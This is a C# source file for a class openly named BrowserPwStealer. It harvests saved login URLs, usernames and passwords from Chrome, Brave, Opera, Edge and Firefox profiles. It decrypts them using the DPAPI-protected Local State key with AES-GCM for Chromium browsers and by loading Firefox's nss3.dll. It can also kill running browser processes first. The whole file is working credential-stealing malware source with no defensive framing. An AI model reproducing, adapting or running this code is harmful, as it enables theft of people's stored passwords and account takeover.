using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Data.SQLite;                       // NuGet: System.Data.SQLite
using Newtonsoft.Json;                          // NuGet: Newtonsoft.Json
using Org.BouncyCastle.Crypto.Modes;            // NuGet: Portable.BouncyCastle
using Org.BouncyCastle.Crypto.Engines;          // NuGet: Portable.BouncyCastle
using Org.BouncyCastle.Crypto.Parameters;       // NuGet: Portable.BouncyCastle

namespace Browser_PWS
{
    /// <summary>
    /// IMPORTANT: Project must be created with x64 if Firefox installation is also x64, otherwise passwords cannot be obtained for it.
    /// </summary>

    public class BrowserPwStealer
    {
        #region Chromium Browsers
        /// <summary>
        /// Get all saved Urls, Usernames and Passwords from Chrome browser.
        /// </summary>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords from Chrome browers.</returns>
        public static string GetChromeLoginData(bool killProcess)
        {
            StringBuilder sb = new StringBuilder();
            string localAppdataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string processName = "chrome";
            string localStatePath = localAppdataPath + "\\Google\\Chrome\\User Data\\Local State";
            List<string> allProfilePaths = GetAllProfiles(localAppdataPath + "\\Google\\Chrome\\User Data");

            foreach (string profilePath in allProfilePaths)
            {
                sb.Append($"\n++++++++++ {profilePath} ++++++++++\n\n");
                sb.Append(GetChromiumBrowserLoginData(processName, profilePath + "\\Login Data", localStatePath, killProcess));
            }

            ErrorLog("Test error!", "Form1/GetChrome");

            return sb.ToString();
        }

        /// <summary>
        /// Get all saved Urls, Usernames and Passwords from Brave browser.
        /// </summary>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords from Brave browers.</returns>
        public static string GetBraveLoginData(bool killProcess)
        {
            StringBuilder sb = new StringBuilder();
            string localAppdataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string processName = "brave";
            string localStatePath = localAppdataPath + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
            List<string> allProfilePaths = GetAllProfiles(localAppdataPath + "\\BraveSoftware\\Brave-Browser\\User Data");

            foreach (string profilePath in allProfilePaths)
            {
                sb.Append($"\n++++++++++ {profilePath} ++++++++++\n\n");
                sb.Append(GetChromiumBrowserLoginData(processName, profilePath + "\\Login Data", localStatePath, killProcess));
            }

            return sb.ToString();
        }

        /// <summary>
        /// Get all saved Urls, Usernames and Passwords from Opera browser.
        /// </summary>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords from Opera browers.</returns>
        public static string GetOperaLoginData(bool killProcess)
        {
            StringBuilder sb = new StringBuilder();
            string localAppdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string processName = "opera";
            string localStatePath = localAppdataPath + "\\Opera Software\\Opera Stable\\Local State";
            List<string> allProfilePaths = new List<string>();
            allProfilePaths.Add(localAppdataPath + "\\Opera Software\\Opera Stable\\Login Data");
            //List<string> allProfilePaths = GetAllProfiles(localAppdataPath + "\\Google\\Chrome\\User Data");

            foreach (string profilePath in allProfilePaths)
            {
                sb.Append($"\n++++++++++ {profilePath} ++++++++++\n\n");
                sb.Append(GetChromiumBrowserLoginData(processName, profilePath, localStatePath, killProcess));
            }

            return sb.ToString();
        }

        /// <summary>
        /// Get all saved Urls, Usernames and Passwords from Edge browser.
        /// </summary>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords from Edge browers.</returns>
        public static string GetMsEdgeLoginData(bool killProcess)
        {
            StringBuilder sb = new StringBuilder();
            string localAppdataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string processName = "msedge";
            string localStatePath = localAppdataPath + "\\Microsoft\\Edge\\User Data\\Local State";
            List<string> allProfilePaths = GetAllProfiles(localAppdataPath + "\\Microsoft\\Edge\\User Data");

            foreach (string profilePath in allProfilePaths)
            {
                sb.Append($"\n++++++++++ {profilePath} ++++++++++\n\n");
                sb.Append(GetChromiumBrowserLoginData(processName, profilePath + "\\Login Data", localStatePath, killProcess));
            }

            return sb.ToString();
        }

        /// <summary>
        /// Get all saved Urls, Usernames and Passwords.
        /// </summary>
        /// <param name="processName">Processname of brower to kill it if its opened. "-" to not kill any browser.</param>
        /// <param name="loginDataPath">Full path to login data file.</param>
        /// <param name="localStatePath">Full path to local state file.</param>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords.</returns>
        public static string GetChromiumBrowserLoginData(string processName, string loginDataPath, string localStatePath, bool killProcess)
        {
            try
            {
                if (killProcess)
                {
                    Process[] processlist = Process.GetProcessesByName(processName);
                    if (processlist.Length != 0)
                        foreach (Process process in processlist)
                            process.Kill();
                }
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Chromium Browsers/V:GetChromiumBrowserLoginData/T:ProcessKillError");
                return $"Error while closing Process \"{processName}\".";
            }

            try
            {
                StringBuilder sb = new StringBuilder();

                byte[] key = GetKey(localStatePath);
                string connectionString = String.Format("Data Source={0};Version=3;", loginDataPath);

                SQLiteConnection conn = new SQLiteConnection(connectionString);
                conn.Open();

                SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
                SQLiteDataReader reader = cmd.ExecuteReader();

                while (reader.Read())
                {
                    string url = reader["origin_url"].ToString();
                    string username = reader["username_value"].ToString();
                    string password = "";
                    byte[] encryptedData = (byte[])reader["password_value"];

                    if (Encoding.UTF8.GetString(encryptedData.Take(3).ToArray()) == "v10")
                    {
                        byte[] nonce, ciphertextTag;
                        Prepare(encryptedData, out nonce, out ciphertextTag);
                        password = Decrypt(ciphertextTag, key, nonce);
                    }
                    else
                    {
                        try
                        {
                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                        }
                        catch
                        {
                            password = "Decryption failed :(";
                        }
                    }

                    sb.Append($"URL: {url}\nUSERNAME: {username}\nPASSWORD: {password}\n\n");
                }

                return sb.ToString();
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Chromium Browsers/V:GetChromiumBrowserLoginData/T:DataError");
                return $"Error while getting login data of \"{processName}\".";
            }
        }

        #region Helper
        private static List<string> GetAllProfiles(string rootPath)
        {
            List<string> profilePaths = new List<string>();
            profilePaths.Add(rootPath + "\\Default");
            try
            {
                int profileNr = 1;
                while (true)
                {
                    if (Directory.Exists(rootPath + "\\Profile " + profileNr))
                        profilePaths.Add(rootPath + "\\Profile " + profileNr);
                    else
                        break;
                    profileNr++;
                }
                return profilePaths;
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Chromium Browsers/R:Helper/V:GetAllProfiles");
                return profilePaths;
            }
        }

        private static byte[] GetKey(string localStatePath)
        {
            try
            {
                string content = File.ReadAllText(localStatePath);
                dynamic json = JsonConvert.DeserializeObject(content);
                string key = json.os_crypt.encrypted_key;
                byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
                byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);

                return decryptedkey;
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Chromium Browsers/R:Helper/V:GetKey");
                return null;
            }
        }

        //Gets cipher parameters for v10 decryption
        private static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        //Decrypts v10 credential
        private static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                return Encoding.UTF8.GetString(plainBytes);
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Chromium Browsers/R:Helper/V:Decrypt");
                return $"Error while decrypting.";
            }
        }
        #endregion Helper	
        #endregion Chromium Browsers

        #region Firefox Browser
        /// <summary>
        /// Get all saved Urls, Usernames and Passwords from Firefox browser. NOTE: It will task kill all running chrome processes.
        /// </summary>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords from Firefox browers.</returns>
        public static string GetFirefoxLoginData(bool killProcess)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                string localAppdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] allProfilePaths = Directory.GetDirectories(localAppdataPath + "\\Mozilla\\Firefox\\Profiles");
                string processName = "firefox";
                string mozillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Replace(" (x86)", "") + "\\Mozilla Firefox\\";
                if (!Directory.Exists(mozillaPath))
                    mozillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
                if (!Directory.Exists(mozillaPath))
                    return "Mozilla path not found... Tried path: " + mozillaPath;

                foreach (string profilePath in allProfilePaths)
                {
                    sb.Append($"\n++++++++++ {profilePath} ++++++++++\n\n");
                    sb.Append(GetFirefoxBrowserLoginData(processName, profilePath, mozillaPath, killProcess));
                }

                return sb.ToString();
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Firefox Browser/V:GetFirefoxLoginData");
                return "Error during initialization of getting Firefox data.";
            }
        }

        /// <summary>
        /// Get all saved Urls, Usernames and Passwords.
        /// </summary>
        /// <param name="processName">Processname of brower to kill it if its opened. "-" to not kill any browser.</param>
        /// <param name="profilePath">Full path to profile.</param>
        /// <param name="mozillaPath">Full path to mozilla program.</param>
        /// <param name="killProcess">Kill browser process. Maybe needed while grabbing Data.</param>
        /// <returns>A string list of all saved Urls, Usernames and Passwords.</returns>
        public static string GetFirefoxBrowserLoginData(string processName, string profilePath, string mozillaPath, bool killProcess)
        {
            try
            {
                if (killProcess)
                {
                    Process[] processlist = Process.GetProcessesByName(processName);
                    if (processlist.Length != 0)
                        foreach (Process process in processlist)
                            process.Kill();
                }
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Firefox Browser/V:GetFirefoxBrowserLoginData/T:ProcessKillError");
                return $"Error while closing Process \"{processName}\".";
            }

            try
            {
                string signonsFile = null;
                string loginsFile = null;
                bool signonsFound = false;
                bool loginsFound = false;
                StringBuilder sb = new StringBuilder();

                string[] files = Directory.GetFiles(profilePath, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                // find &quot;logins.json"file
                files = Directory.GetFiles(profilePath, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                    FFDecryptor.NSS_Init(profilePath, mozillaPath);
                else
                    return "No login data found!";

                if (signonsFound)
                {
                    using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
                    {
                        conn.Open();
                        using (var command = conn.CreateCommand())
                        {
                            command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                            using (var reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    string url = reader.GetString(2);
                                    string username = FFDecryptor.Decrypt(reader.GetString(0));
                                    string password = FFDecryptor.Decrypt(reader.GetString(1));
                                    sb.Append($"URL: {url}\nUSERNAME: {username}\nPASSWORD: {password}\n\n");
                                }
                            }
                        }
                        conn.Close();
                    }
                }

                if (loginsFound)
                {
                    FFLogins ffLoginData;
                    using (StreamReader sr = new StreamReader(loginsFile))
                    {
                        string json = sr.ReadToEnd();
                        ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
                    }

                    foreach (LoginData loginData in ffLoginData.logins)
                    {
                        string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                        string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                        sb.Append($"URL: {loginData.hostname}\nUSERNAME: {username}\nPASSWORD: {password}\n\n");
                    }
                }
                if (sb.ToString() != "")
                    return sb.ToString();
                else
                    return "No login data found!";
            }
            catch (Exception ex)
            {
                ErrorLog(ex.Message, "BrowserPwStealer/R:Firefox Browser/V:GetFirefoxBrowserLoginData");
                return "Error while getting login data.";
            }
        }

        #region Helper
        class FFLogins
        {
            public long nextId { get; set; }
            public LoginData[] logins { get; set; }
            public string[] disabledHosts { get; set; }
            public int version { get; set; }
        }

        class LoginData
        {
            public long id { get; set; }
            public string hostname { get; set; }
            public string url { get; set; }
            public string httprealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public long timesUsed { get; set; }
        }
        #endregion Helper
        #endregion Firefox Browser

        #region Error Handling
        public static StringBuilder errorLogs = new StringBuilder();

        /// <summary>
        /// Method where all the Errors come together.
        /// </summary>
        /// <param name="errorMessage">Error message</param>
        /// <param name="errorPath">Path to method, usefull to find bugs later.</param>
        public static void ErrorLog(string errorMessage, string errorPath)
        {
            errorLogs.AppendLine("ERROR {" + errorPath + "}:" + errorMessage);
        }

        /// <summary>
        /// Method to get all occured Errors.
        /// </summary>
        /// <returns>A string list of all errors.</returns>
        public static string GetErrorLog()
        {
            return errorLogs.ToString();
        }

        /// <summary>
        /// Method to clear the error Log
        /// </summary>
        /// <returns>Success of the clear.</returns>
        public static string ClearErrorLog()
        {
            errorLogs.Clear();
            return "Error Logs successfully cleared!";
        }
        #endregion Error Handling
    }

    static class FFDecryptor
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr NSS3;

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            try
            {
                IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
                DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
                return dll(ref data, ref result, cx);
            }
            catch (Exception ex)
            {
                BrowserPwStealer.ErrorLog(ex.Message, "FFDecryptor/V:PK11SDR_Decrypt");
                return 0;
            }
        }

        public static long NSS_Init(string configdir, string mozillaPath)
        {
            try
            {
                LoadLibrary(mozillaPath + "mozglue.dll");
                NSS3 = LoadLibrary(mozillaPath + "nss3.dll");
                IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
                try
                {
                    DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
                    return dll(configdir);
                }
                catch (Exception ex)
                {
                    BrowserPwStealer.ErrorLog("Firefox does not match with app version (32 bit and 64 bit)!\nMESSAGE: " + ex.Message, "FFDecryptor/V:NSS_Init/T:VersionsNotMatch");
                    return 0;
                }
            }
            catch (Exception ex)
            {
                BrowserPwStealer.ErrorLog(ex.Message, "FFDecryptor/V:NSS_Init");
                return 0;
            }
        }

        public static string Decrypt(string cypherText)
        {
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            StringBuilder sb = new StringBuilder(cypherText);

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch (Exception ex)
            {
                BrowserPwStealer.ErrorLog(ex.Message, "FFDecryptor/V:Decrypt");
                return "Error while decrypting :(";
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
            }

            return null;
        }
    }
}
